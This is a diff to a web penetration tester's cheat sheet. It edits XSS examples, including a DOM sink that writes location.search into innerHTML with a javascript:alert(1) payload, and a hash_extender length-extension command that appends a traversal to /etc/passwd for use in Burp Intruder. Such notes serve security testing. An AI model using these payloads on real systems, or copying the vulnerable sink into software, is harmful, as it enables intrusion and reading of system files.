@@ -1,6 +1,6 @@
 # Tricks - Web Penetration Tester
 
-- [x] In Construction... (50%)
+- [x] In Construction... (60%)
 
 ## WAF
 
@@ -192,7 +192,7 @@ var name="here";
 
 #### Event Attributes
 
-<button onclick="reserve(here);">
+\<button onclick="reserve(here);">
   
 Okay!
   
@@ -202,11 +202,7 @@ Okay!
 
 Dom Based
   
-<script>
-
-var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href='"+ok+"'>ok</a>";
- 
-</script>
+\<script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
   
 -> javascript:alert(1)
 
@@ -492,7 +488,7 @@ https://github.com/iagox86/hash_extender
 
 https://site.com/index.php?file=oktest&hash=hash
 
-./hash_extender -f sha1 --data 'ok' -s hash --append '../../../../../../../../../etc/passwd' --secret-min=10 --secret-max=40 --out-data-format=html --table > payloads.out
+./hash_extender -f sha1 --data 'oktest' -s hash --append '../../../../../../../../../etc/passwd' --secret-min=10 --secret-max=40 --out-data-format=html --table > payloads.out
 
 burp intruder -> payloads.out in file parameter.  
   
